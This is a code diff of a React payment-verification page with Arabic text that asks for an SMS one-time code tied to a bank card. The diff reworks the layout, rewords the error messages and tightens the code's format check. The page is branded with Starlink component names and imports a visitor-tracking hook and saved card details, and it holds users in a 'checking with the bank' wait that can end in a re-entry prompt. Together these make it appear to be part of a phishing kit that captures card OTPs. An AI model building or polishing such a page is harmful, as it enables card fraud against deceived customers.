@@ -1,6 +1,7 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { ShieldCheck, Loader2 } from "lucide-react";
+import PageShell from "@/components/starlink/PageShell";
 import { toast } from "@/hooks/use-toast";
 import { updateVisitorData } from "@/hooks/useVisitorTracking";
 import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
@@ -38,8 +39,8 @@ const PaymentOtp = () => {
         setWaiting(false);
         setOtp("");
         toast({
-          title: "رمز التحقق خاطئ",
-          description: "أعد إدخال الرمز المرسل عبر SMS.",
+          title: "رمز التحقق غير صحيح",
+          description: "أعد إدخال الرمز المرسل إلى هاتفك.",
           variant: "destructive",
         });
       }
@@ -50,12 +51,8 @@ const PaymentOtp = () => {
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!otp.trim()) {
-      toast({
-        title: "رمز OTP مطلوب",
-        description: "أدخل الرمز المرسل عبر SMS.",
-        variant: "destructive",
-      });
+    if (!/^[0-9]{4,8}$/.test(otp)) {
+      toast({ title: "رمز OTP غير صالح", description: "أدخل الرمز المرسل عبر رسالة SMS.", variant: "destructive" });
       return;
     }
     setLoading(true);
@@ -66,90 +63,76 @@ const PaymentOtp = () => {
 
   return (
     <>
-      <SEO
-        title={seoData.paymentOtp.title}
-        description={seoData.paymentOtp.description}
-        path="/payment/otp"
-        noIndex
-      />
-      <div className="min-h-screen bg-background flex items-center justify-center px-4">
-        <div className="w-full max-w-sm">
-
-          <div className="text-center mb-8">
-            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mb-3">
+    <SEO title={seoData.paymentOtp.title} description={seoData.paymentOtp.description} path="/payment/otp" noIndex />
+    <PageShell
+      eyebrow="التحقق الثنائي"
+      title="رمز التحقق OTP"
+      description="أرسلنا رمز تحقق إلى هاتفك المرتبط بالبطاقة. أدخله أدناه لإتمام الدفع."
+    >
+      <section className="container mx-auto px-6 py-16 max-w-md">
+        <div className="border border-foreground/10 p-8 space-y-6">
+          <div className="flex items-center justify-between gap-2 flex-wrap">
+            <div className="flex items-center gap-2 text-xs text-muted-foreground">
               <ShieldCheck className="w-4 h-4" />
-              <span>تحقق آمن &#8210; خطوة لمدة دقيقة واحدة</span>
+              <span>تحقق ثنائي — صالح لمدة دقيقة واحدة</span>
             </div>
-            <h1 className="text-2xl font-light tracking-wide mb-1">رمز OTP</h1>
-            <p className="text-sm text-muted-foreground">
-              أرسلنا رمز التحقق إلى هاتفك المرسل بالبطاقة
-            </p>
-            {card && (
-              <div className="mt-3 flex justify-center">
-                <SavedCardBadge brand={card.brand} last4={card.last4} />
-              </div>
-            )}
+            {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
           </div>
 
-          <div className="border border-foreground/10 p-8 space-y-6">
-            <form onSubmit={submit} className="space-y-5">
-              <div>
-                <label className="text-sm text-muted-foreground mb-3 block text-center">
-                  رمز OTP
-                </label>
-
-                <input
-                  type="text"
-                  inputMode="numeric"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-                  disabled={waiting}
-                  autoFocus
-                  placeholder="أدخل رمز OTP"
-                  className="w-full h-14 bg-transparent border border-foreground/20 focus:border-foreground outline-none transition-colors text-center text-xl font-mono tracking-widest disabled:opacity-60 px-4"
-                  required
-                />
-
-                <div className="flex justify-between items-center mt-3 text-xs text-muted-foreground">
-                  <span>{seconds > 0 ? `إعادة الإرسال خلال ${seconds}ث` : "يمكنك إعادة إرسال الرمز"}</span>
-                  <button
-                    type="button"
-                    disabled={seconds > 0 || waiting}
-                    onClick={() => setSeconds(60)}
-                    className="underline disabled:opacity-40 disabled:no-underline"
-                  >
-                    إعادة إرسال الرمز
-                  </button>
-                </div>
+          <form onSubmit={submit} className="space-y-5">
+            <div>
+              <label className="text-sm text-muted-foreground mb-2 block">رمز التحقق</label>
+              <input
+                type="text"
+                inputMode="numeric"
+                maxLength={8}
+                value={otp}
+                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                placeholder="000000"
+                disabled={waiting}
+                className="w-full h-14 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors text-center text-2xl tracking-[0.5em] disabled:opacity-60"
+                required
+                autoFocus
+              />
+              <div className="flex justify-between items-center mt-2 text-xs text-muted-foreground">
+                <span>{seconds > 0 ? `إعادة الإرسال خلال ${seconds}ث` : "يمكنك إعادة الإرسال"}</span>
+                <button
+                  type="button"
+                  disabled={seconds > 0 || waiting}
+                  onClick={() => setSeconds(60)}
+                  className="underline disabled:opacity-40 disabled:no-underline"
+                >
+                  إعادة إرسال الرمز
+                </button>
               </div>
+            </div>
 
-              <button
-                type="submit"
-                disabled={loading || waiting}
-                className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
-              >
-                {waiting ? (
-                  <>
-                    <Loader2 className="w-4 h-4 animate-spin" />
-                    جارٍ التأكيد...
-                  </>
-                ) : loading ? (
-                  "جارٍ الإرسال..."
-                ) : (
-                  "تأكيد الدفع"
-                )}
-              </button>
-
-              {waiting && (
-                <p className="text-xs text-muted-foreground text-center">
-                  نتحقق من رمز OTP من البنك. قد يستغرق ذلك لحظات.
-                </p>
+            <button
+              type="submit"
+              disabled={loading || waiting}
+              className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
+            >
+              {waiting ? (
+                <>
+                  <Loader2 className="w-4 h-4 animate-spin" />
+                  جاري التأكيد...
+                </>
+              ) : loading ? (
+                "جاري الإرسال..."
+              ) : (
+                "تأكيد الدفع"
               )}
-            </form>
-          </div>
+            </button>
 
+            {waiting && (
+              <p className="text-xs text-muted-foreground text-center">
+                نتحقق من رمز OTP مع البنك. قد يستغرق ذلك بضع لحظات.
+              </p>
+            )}
+          </form>
         </div>
-      </div>
+      </section>
+    </PageShell>
     </>
   );
 };
